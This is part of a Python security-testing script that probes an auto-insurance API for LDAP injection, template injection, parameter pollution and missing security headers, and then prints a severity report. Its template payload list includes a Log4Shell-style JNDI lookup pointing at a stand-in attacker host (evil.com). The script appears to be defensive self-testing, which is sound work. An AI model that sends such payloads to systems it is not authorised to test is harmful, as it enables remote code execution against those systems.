        print(f"{Colors.BOLD}Testing LDAP Injection...{Colors.RESET}")
        
        for payload in self.LDAP_INJECTION_PAYLOADS:
            try:
                response = self.session.post(
                    f"{self.api_prefix}/auth/login",
                    json={"username": payload, "password": "test"},
                    timeout=5
                )
                
                response_text = response.text.lower()
                ldap_errors = [
                    "ldap", "ldap error", "invalid dn", "syntax error",
                    "invalid filter", "ldap_simple_bind"
                ]
                
                if any(error in response_text for error in ldap_errors):
                    self.log_result(SecurityTestResult(
                        "LDAP Injection",
                        "/auth/login",
                        "POST",
                        True,
                        "LDAP error detected",
                        "HIGH",
                        payload
                    ))
            except Exception:
                pass
        
        print(f"{Colors.GREEN}✓ LDAP injection tests completed{Colors.RESET}\n")
    
    def generate_report(self):
        """Generate comprehensive security test report."""
        print(f"\n{Colors.BOLD}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}AGGRESSIVE SECURITY TEST REPORT{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*70}{Colors.RESET}\n")
        
        vulnerable = [r for r in self.results if r.vulnerable]
        safe = [r for r in self.results if not r.vulnerable]
        
        print(f"Total Tests: {len(self.results)}")
        print(f"{Colors.RED}Vulnerabilities Found: {len(vulnerable)}{Colors.RESET}")
        print(f"{Colors.GREEN}Safe: {len(safe)}{Colors.RESET}\n")
        
        if vulnerable:
            print(f"{Colors.BOLD}VULNERABILITIES:{Colors.RESET}\n")
            
            # Group by severity
            critical = [r for r in vulnerable if r.severity == "CRITICAL"]
            high = [r for r in vulnerable if r.severity == "HIGH"]
            medium = [r for r in vulnerable if r.severity == "MEDIUM"]
            low = [r for r in vulnerable if r.severity == "LOW"]
            
            if critical:
                print(f"{Colors.RED}{Colors.BOLD}CRITICAL SEVERITY:{Colors.RESET}\n")
                for result in critical:
                    print(f"{Colors.RED}● {result.test_name}{Colors.RESET}")
                    print(f"  Endpoint: {result.method} {result.endpoint}")
                    print(f"  Payload: {result.payload[:80] if result.payload else 'N/A'}...")
                    print(f"  Details: {result.details}\n")
            
            if high:
                print(f"{Colors.RED}{Colors.BOLD}HIGH SEVERITY:{Colors.RESET}\n")
                for result in high:
                    print(f"{Colors.RED}● {result.test_name}{Colors.RESET}")
                    print(f"  Endpoint: {result.method} {result.endpoint}")
                    if result.payload:
                        print(f"  Payload: {result.payload[:80]}...")
                    print(f"  Details: {result.details}\n")
            
            if medium:
                print(f"{Colors.YELLOW}{Colors.BOLD}MEDIUM SEVERITY:{Colors.RESET}\n")
                for result in medium:
                    print(f"{Colors.YELLOW}● {result.test_name}{Colors.RESET}")
                    print(f"  Endpoint: {result.method} {result.endpoint}")
                    if result.payload:
                        print(f"  Payload: {result.payload[:80]}...")
                    print(f"  Details: {result.details}\n")
            
            if low:
                print(f"{Colors.BLUE}{Colors.BOLD}LOW SEVERITY:{Colors.RESET}\n")
                for result in low:
                    print(f"{Colors.BLUE}● {result.test_name}{Colors.RESET}")
                    print(f"  Endpoint: {result.method} {result.endpoint}")
                    print(f"  Details: {result.details}\n")
        
        # Summary by severity
        print(f"\n{Colors.BOLD}Severity Breakdown:{Colors.RESET}")
        print(f"{Colors.RED}  CRITICAL: {len(critical)}{Colors.RESET}")
        print(f"{Colors.RED}  HIGH: {len(high)}{Colors.RESET}")
        print(f"{Colors.YELLOW}  MEDIUM: {len(medium)}{Colors.RESET}")
        print(f"{Colors.BLUE}  LOW: {len(low)}{Colors.RESET}\n")
        
        if not vulnerable:
            print(f"{Colors.GREEN}✓ No vulnerabilities detected!{Colors.RESET}\n")
        
        return len(vulnerable) == 0
    
    def run_all_tests(self):
        """Run all aggressive security tests."""
        print(f"{Colors.BOLD}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}AGGRESSIVE SECURITY TESTING - Auto Insurance System API{Colors.RESET}")
        print(f"{Colors.BOLD}{'='*70}{Colors.RESET}\n")
        print(f"Testing API at: {self.api_prefix}\n")
        
        self.setup_auth()
        
        self.test_advanced_sql_injection()
        self.test_advanced_xss()
        self.test_command_injection()
        self.test_ssrf()
        self.test_idor()
        self.test_jwt_attacks()
        self.test_mass_assignment()
        self.test_open_redirect()
        self.test_http_header_injection()
        self.test_timing_attacks()
        self.test_nosql_injection()
        self.test_xxe_injection()
        self.test_deserialization()
        self.test_path_traversal_advanced()
        self.test_ldap_injection()
        self.test_template_injection()
        self.test_http_parameter_pollution()
        self.test_insecure_directives()
        
        return self.generate_report()
    
    def test_template_injection(self):
        """Test for template injection vulnerabilities."""
        print(f"{Colors.BOLD}Testing Template Injection...{Colors.RESET}")
        
        template_payloads = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "${jndi:ldap://evil.com/a}",
        ]
        
        if self.auth_token:
            for payload in template_payloads:
                try:
                    response = self.session.post(
                        f"{self.api_prefix}/data-generator/generate-event",
                        json={
                            "driver_id": payload,
                            "latitude": 37.7749,
                            "longitude": -122.4194
                        },
                        timeout=5
                    )
                    
                    if "49" in response.text:
                        self.log_result(SecurityTestResult(
                            "Template Injection",
                            "/data-generator/generate-event",
                            "POST",
                            True,
                            "Template evaluation detected",
                            "CRITICAL",
                            payload
                        ))
                except Exception:
                    pass
        
        print(f"{Colors.GREEN}✓ Template injection tests completed{Colors.RESET}\n")
    
    def test_http_parameter_pollution(self):
        """Test for HTTP Parameter Pollution."""
        print(f"{Colors.BOLD}Testing HTTP Parameter Pollution...{Colors.RESET}")
        
        if self.auth_token:
            try:
                response = self.session.get(
                    f"{self.api_prefix}/drivers/DRV-0001/trips?driver_id=DRV-0001&driver_id=DRV-0002",
                    timeout=5
                )
                
                if response.status_code == 200:
                    data = response.json()
                    trips = data.get("trips", [])
                    if trips and any(t.get("driver_id") == "DRV-0002" for t in trips):
                        self.log_result(SecurityTestResult(
                            "HTTP Parameter Pollution",
                            "/drivers/DRV-0001/trips",
                            "GET",
                            True,
                            "Second parameter value used",
                            "MEDIUM",
                            "duplicate driver_id parameter"
                        ))
            except Exception:
                pass
        
        print(f"{Colors.GREEN}✓ HTTP parameter pollution tests completed{Colors.RESET}\n")
    
    def test_insecure_directives(self):
        """Test for insecure security directives."""
        print(f"{Colors.BOLD}Testing Security Headers...{Colors.RESET}")
        
        try:
            response = self.session.get(f"{self.api_prefix}/health", timeout=5)
            headers = response.headers
            
            missing_headers = []
            security_headers = {
                "X-Content-Type-Options": "nosniff",
                "X-Frame-Options": "DENY",
                "X-XSS-Protection": "1; mode=block",
                "Strict-Transport-Security": "max-age=31536000",
            }
            
            for header, expected_value in security_headers.items():
                if header not in headers:
                    missing_headers.append(header)
                elif expected_value and expected_value not in headers[header]:
                    missing_headers.append(f"{header} (incorrect value)")
            
            if missing_headers:
                self.log_result(SecurityTestResult(
                    "Missing Security Headers",
                    "/health",
                    "GET",
                    True,
                    f"Missing: {', '.join(missing_headers)}",
                    "MEDIUM",
                    "security headers check"
                ))
        except Exception:
            pass
        
        print(f"{Colors.GREEN}✓ Security headers tests completed{Colors.RESET}\n")


def main():
    """Main entry point."""
    tester = AggressiveSecurityTester()
    success = tester.run_all_tests()
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()

